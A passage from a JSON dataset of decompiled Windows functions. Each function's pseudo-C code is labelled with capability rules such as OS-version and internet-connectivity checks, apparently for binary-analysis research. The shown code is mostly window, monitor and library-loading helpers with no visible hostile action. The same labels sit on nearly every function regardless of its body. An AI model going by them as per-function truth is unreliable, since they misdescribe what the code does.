0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040dbb8();\n        fcn.00404ec4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419898();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040dbb8();\n        fcn.00404ec4();\n    }\n    if (var_1ch == 1) {\n        fcn.0042da44(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0042da44(&stack0xfffffffc);\n    }\n    else {\n        fcn.00407050();\n        fcn.0042da44(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x42dd58;\n    uStack76 = 0x42dd25;\n    fcn.0040700c();\n    uStack76 = 0x42dd2d;\n    fcn.00405530();\n    uStack76 = 0x42dd40;\n    fcn.004060f8();\n    uStack76 = 0x42dd48;\n    fcn.0040700c();\n    uStack76 = 0x42dd50;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 825
    },
    "0042dd88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd88(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42de47;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040dbb8();\n        fcn.00404ec4();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419898();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42de4e;\n    uStack36 = 0x42de3e;\n    fcn.0040700c();\n    uStack36 = 0x42de46;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 430
    },
    "0042deb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042deb4(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42decd;\n    fcn.004059cc();\n    uStack28 = 0x42df5e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0042dad8();\n    }\n    else if (iVar1 == 2) {\n        fcn.0042d540();\n    }\n    else if (iVar1 == 3) {\n        fcn.0042d570();\n    }\n    else if (iVar1 == 8) {\n        fcn.0042dad8();\n    }\n    else {\n        fcn.0042d6d4(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x42df65;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 346
    },
    "0042d2e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d2e4(void)\n\n{\n    if (*0x499a74 == 0) {\n        fcn.0042d394();\n        fcn.00407024();\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "0042d310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0042d310(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0042d2e4();\n    uVar1 = fcn.00407050();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 96
    },
    "0042d570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d570(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d6c5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x42d59d;\n    piVar3 = fcn.00404620();\n    uStack52 = 0x42d67a;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(in_EAX + 0x10) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            iVar4 = fcn.00419898();\n            cVar2 = (**(**(iVar4 + 4) + 0x18))();\n            if (cVar2 != '\\0') {\n                (**(**(iVar4 + 4) + 0xc))();\n                (**(*piVar3 + 0x3c))();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    iVar5 = (**(*piVar3 + 0x14))();\n    if (iVar5 == 1) {\n        iVar5 = (**(*piVar3 + 0x18))();\n        (**(**(iVar5 + 4) + 0x1c))();\n    }\n    else {\n        iVar5 = (**(*piVar3 + 0x14))();\n        if ((0 < iVar5) && (*(in_EAX + 0xc) != 0)) {\n            (**(*piVar3 + 0x90))();\n            (**(**(in_EAX + 0xc) + 0x10))();\n            (**(*piVar3 + 0x18))();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x42d681;\n    uStack52 = 0x42d679;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 622
    },
    "0042d6d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d6d4(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d778;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        fcn.00405584();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00419898();\n            fcn.0040700c(*(iVar3 + 4));\n            cVar2 = fcn.0040f954();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))(arg_8h, arg_ch);\n                break;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42d77f;\n    uStack40 = 0x42d777;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 389
    },
    "0042e174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e174(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42e18a;\n    fcn.004059cc();\n    uStack28 = 0x42e231;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x499aa0) == '\\0') {\n        if (*0x499a9c == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x499aa8 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x499a88 = fcn.0042e174(),  *0x499aa8 == '\\0')) {\n                fcn.00405530();\n            }\n            uVar1 = fcn.004059dc();\n            in_stack_ffffffd8 = *0x499a9c;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x499a9c, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x499aa8 = '\\x01';\n        }\n        *(in_AL + 0x499aa0) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42e238;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 438
    },
    "0042e258": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e258(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x499aa0 == '\\0') {\n        *0x499a78 = fcn.0042e174();\n        (**0x499a78)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "0042e2e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e2e0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x499aa2 == '\\0') {\n        *0x499a80 = fcn.0042e174();\n        uVar1 = (**0x499a80)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x499a78)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x499a78)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 237
    },
    "0042e370": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e370(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x499aa1 == '\\0') {\n        *0x499a7c = fcn.0042e174();\n        uVar1 = (**0x499a7c)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0042e2e0(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 240
    },
    "0042e408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e408(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x499aa3 == '\\0') {\n        *0x499a84 = fcn.0042e174();\n        uVar1 = (**0x499a84)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x499a78)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x499a78)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 236
    },
    "0042e4a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e4a0(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x499aa4 == '\\0') {\n        *0x499a88 = fcn.0042e174();\n        uVar1 = (**0x499a88)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x499a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x499a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e56c);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "0042e574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e574(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x499aa5 == '\\0') {\n        *0x499a8c = fcn.0042e174();\n        uVar1 = (**0x499a8c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x499a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x499a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e640);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 399
    },
    "0042e648": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e648(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x499aa6 == '\\0') {\n        *0x499a90 = fcn.0042e174();\n        uVar1 = (**0x499a90)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x499a78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x499a78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e714);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 397
    },
    "0042e71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e71c(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x499aa7 == '\\0') {\n        *0x499a94 = fcn.0042e174();\n        uVar1 = (**0x499a94)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x499a78)(0);\n            var_10h = (**0x499a78)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 554
    },
    "0042ea7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ea7c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00407688();\n    if (*(iVar1 + 0x10) != 0) {\n        iVar1 = fcn.00407688();\n        iVar1 = sub.user32.dll_IsWindow(*(iVar1 + 0x10));\n        if (iVar1 != 0) goto code_r0x0042eb13;\n    }\n    do {\n        uVar2 = sub.user32.dll_FindWindowExA();\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0x10) = uVar2;\n        fcn.00407688();\n        iVar1 = fcn.00407688();\n        if (*(iVar1 + 0x10) == 0) break;\n        iVar1 = fcn.00407688(0);\n        iVar1 = sub.user32.dll_GetWindowThreadProcessId(*(iVar1 + 0x10));\n        iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    } while (iVar1 != iVar3);\ncode_r0x0042eb13:\n    iVar1 = fcn.00407688();\n    return *(iVar1 + 0x10);\n}\n",
        "token_count": 282
    },
    "0042ec20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ec20(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42ec58);\n    if (iVar1 != 0) {\n        *0x499aac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42ec64);\n    }\n    if (*0x499aac == NULL) {\n        *0x499aac = fcn.0042eb3c;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0042ec80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ec80(uint arg_8h, uint arg_ch)\n\n{\n    if (*0x499aac == NULL) {\n        fcn.0042ec20();\n    }\n    (**0x499aac)();\n    return;\n}\n",
        "token_count": 55
    },
    "0042ecbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0042ecbc(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "0042eed4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042eed4(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x499b7c == NULL) {\n        uVar1 = 0;\n        if (*0x499b70 != 0) {\n            *0x499b7c = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42ef4c);\n            if (*0x499b7c != NULL) {\n                uVar1 = (**0x499b7c)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x499b7c)();\n    }\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "0042ef60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ef60(void)\n\n{\n    uint uVar1;\n    \n    if (*0x499b80 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x499b70 != 0) {\n            *0x499b80 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42efb8);\n            if (*0x499b80 != NULL) {\n                uVar1 = (**0x499b80)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x499b80)();\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0042efcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042efcc(void)\n\n{\n    uint uVar1;\n    \n    if (*0x499b84 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x499b70 != 0) {\n            *0x499b84 = sub.kernel32.dll_GetProcAddress_1(*0x499b70, 0x42f02c);\n            if (*0x499b84 != NULL) {\n                uVar1 = (**0x499b84)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x499b84)();\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0042f044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042f044(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42f051;\n    fcn.0042eec4();\n    uStack12 = 0x42f1fb;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x499b74) {\n        *0x499b74 = *0x499b74 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x499b70 != 0) && (puStack8 = &stack0xfffffffc,  *0x499b74 == 0)) {\n        iStack20 = *0x499b70;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x499b70 = 0;\n        *0x499ab0 = 0;\n        *0x499ab4 = 0;\n        *0x499ab8 = 0;\n        *0x499abc = 0;\n        *0x499ac0 = 0;\n        *0x499ac4 = 0;\n        *0x499ac8 = 0;\n        *0x499acc = 0;\n        *0x499ad0 = 0;\n        *0x499ad4 = 0;\n        *0x499ad8 = 0;\n        *0x499adc = 0;\n        *0x499ae0 = 0;\n        *0x499ae4 = 0;\n        *0x499ae8 = 0;\n        *0x499aec = 0;\n        *0x499af0 = 0;\n        *0x499af4 = 0;\n        *0x499af8 = 0;\n        